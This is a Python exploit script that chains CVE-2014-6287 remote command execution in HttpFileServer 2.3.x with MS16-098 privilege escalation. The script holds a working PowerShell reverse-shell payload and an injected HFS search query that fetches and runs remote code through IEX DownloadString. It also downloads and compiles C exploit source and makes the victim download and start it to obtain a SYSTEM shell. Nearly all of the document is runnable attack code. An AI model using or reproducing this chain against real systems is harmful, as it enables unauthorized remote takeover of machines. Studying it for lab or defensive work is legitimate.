# -*- coding: utf-8 -*-

# HttpFileServer 2.3.x Remote Command Execution + Privilege Escalation (MS16-098)
# CVE: 2014-6287
# MS16-098
# Exploit author (HFS): Avinash Kumar Thapa
# Exploit author (MS16-098): -
# https://www.exploit-db.com/exploits/39161 (HFS)
# https://www.exploit-db.com/exploits/41020 (MS16-098)
# Python script exploit author: Renan Almeida a.k.a. nullarmor <nullarmor@protonmail.com>

# ** This exploit has some delay when dealing with the reverse shell step and i don't know why lol
# Sometimes you gotta wait for 1 minute to spawn the shell completely **
 

import argparse
import http.server
import random
import requests
import socketserver
import string
import sys
import threading
from pwn import *
from requests.utils import requote_uri


def main():
    
    # args
    argparser = argparse.ArgumentParser(description='HttpFileServer 2.3.x Remote Command Execution + Privilege Escalation (MS16-098)', 
                                        add_help=False)
    main_arg = argparser.add_argument_group("MAIN")
    
    main_arg.add_argument('-h', '--help', 
                            help='Show this help menu', 
                            action='store_true')
    
    main_arg.add_argument('--rhost', type=str,
                            help='HFS host', 
                            required=True)
                            
    main_arg.add_argument('--lhost', type=str,
                            help='Local host to receive reverse shell', 
                            required=True)
    
    main_arg.add_argument('--lport', type=str,
                            help='Local port to receive reverse shell (default: 4444)', 
                            default='4444')
    
    main_arg.add_argument('--lfileserverport', type=str,
                            help='Local port to serve the ps1 file (default: 5555)', 
                            default='5555')
    
    main_arg.add_argument('--burpsuite', action='store_true',
                            help='Enable burpsuite proxy')
                            
    args = argparser.parse_args()
    
    # arg validation
    if args.help:
        argparser.print_help()
        sys.exit(1)
    
    # cons
    rhost = args.rhost
    lhost = args.lhost
    lport = args.lport
    lfileserverport = args.lfileserverport
    burpsuite = args.burpsuite
    
    
    def string_generator():
        letters = string.ascii_letters
        return ''.join(random.choice(letters) for i in range(8))
    
    
    def generate_c_exploit():
        # *** IMPORTANT ***
        # To make it work you should have the gcc cross compiler for x86_64 called 'x86_64-w64-mingw32-gcc' in order to generate the .exe exploit
        # Also you need to download and edit some libraries required by mingw64:
        # d3dnthal.h - https://raw.githubusercontent.com/Alexpux/mingw-w64/master/mingw-w64-headers/ddk/include/d3dnthal.h
        # ddrawint.h - https://raw.githubusercontent.com/Alexpux/mingw-w64/master/mingw-w64-headers/ddk/include/ddrawint.h
        # dvp.h - https://raw.githubusercontent.com/Alexpux/mingw-w64/master/mingw-w64-headers/ddk/include/dvp.h
        
        print(" [*] Getting MS16-098 source code from Gist and saving on local directory...")
        
        try:
            ms11_046_sc = requests.get("https://gist.githubusercontent.com/nullarmor/a642c0b9bece6a3fb2002ba33e7936ea/raw/b6310029fd855a79b7974740dda904c1324216e5/ms16-098_modified.c").text
            
            with open('/tmp/{}.c'.format(randname),'w') as f:
                f.write(ms11_046_sc.replace('LHOST', lhost).replace('LPORT', str(int(lport)+1)))
                f.close()
        
        except Exception as e:
            print(e)
            print(" [*] Failed to retrieve MS16-098 source code!")
            sys.exit(1)
        
        else:
            print(" [*] MS16-098 file saved: {}.c".format(randname))
            print(" [*] Compiling using x86_64-w64-mingw32-gcc...")
            
            try:
                os.system("x86_64-w64-mingw32-gcc /tmp/{}.c -o /tmp/{}.exe -w -lgdi32 -lpsapi".format(randname, randname))
            
            except Exception as e:
                print(e)
                print(" [*] Failed to compile the exploit :(")
                sys.exit(1)
            
            else:
                print(" [*] Exploit compiled with success!")
                return True
    
    
    def reverse_shell(l):
        
        ps_payload = 'powershell.exe -nop -exec bypass -c "'
        ps_payload += '''Invoke-WebRequest -Uri 'http://{}:{}/{}.exe' -OutFile 'C:\\Users\\kostas\\Desktop\\{}.exe';Start-Process ('{}.exe')"'''.format(
                                                                                                lhost, lfileserverport,
                                                                                                randname, randname, randname)
        
        
        print(" [*] Spawning the initial reverse shell with low privileges...")
        
        try:
            l.sendline(ps_payload)
        except Exception as e:
            print(e)
            print(" [*] Initial reverse shell has failed!")
            sys.exit(1)
        else:
            l.close()
            print(" [*] Escalating to NT AUTHORITY\\SYSTEM using MS16-098 modified exploit...")
            print(" [*] Spawning the second reverse shell with SYSTEM privileges (in 30 secs maybe?)...")
            
            try:
                l = listen(str(int(lport) + 1))
                l.sendline("""whoami""")
                l.interactive()
            except Exception as e:
                print(e)
                print(" [*] SYSTEM shell failed!")
                sys.exit(1)
        
    
    def generate_ps1():
    
        print(" [*] Generating the PowerShell payload to be downloaded from your victim...")
 
        ps_payload = "$client = New-Object System.Net.Sockets.TCPClient('"+lhost+"',"+lport+");"
        ps_payload += "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};"
        ps_payload += "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;"
        ps_payload += "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
        ps_payload += "$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
        ps_payload += "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        ps_payload += '$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
        
        try:
            with open('/tmp/{}.ps1'.format(randname),'w') as f:
                f.write(ps_payload)
                f.close()
        except Exception as e:
            print(" [*] Failed to generate the PowerShell payload!")
            sys.exit(1)
        else:
            print(" [*] PS1 file generated with success!")
                
    
    class quietServer(http.server.SimpleHTTPRequestHandler):
        def __init__(self, *args, **kwargs):
            super().__init__(*args, directory='/tmp', **kwargs)
        
        def log_message(self, format, *args):
            pass
        
    
    def start_server(): 
        with socketserver.TCPServer(("", int(lfileserverport)), quietServer) as httpd:
            httpd.serve_forever()
            
    
    def exploit():
        threading.Thread(target=start_server).start()
        
        ps_payload = 'powershell.exe -nop -exec bypass -c "'
        ps_payload += 'IEX(New-Object System.Net.WebClient).DownloadString(\'http://{}:{}/{}.ps1\');"'.format(
                                                                                                lhost, lfileserverport,
                                                                                                randname)
        ps_payload = requote_uri(ps_payload)
        
        print(" [*] Exploiting the HFS web application...")
        
        l = listen(lport)
        
        try:
            if burpsuite:
                requests.get("http://"+rhost+"/?search=%00{.+exec|"+ps_payload+".}", proxies=proxies)
            else:
                requests.get("http://"+rhost+"/?search=%00{.+exec|"+ps_payload+".}")
        
        except:
            print(" [*] Failed to exploit the HFS web application!")
            sys.exit(1)
        
        else:
            print(" [*] HFS exploited!")
            reverse_shell(l)
        
            
    # main 
    print(" [>] HttpFileServer 2.3.x Remote Command Execution + Privilege Escalation (MS16-098)")
    print(" [*] Python script exploit author: nullarmor")
    
    randname = string_generator()
    if generate_c_exploit():
        generate_ps1()
        exploit()    
        
if __name__ == "__main__":
    main()
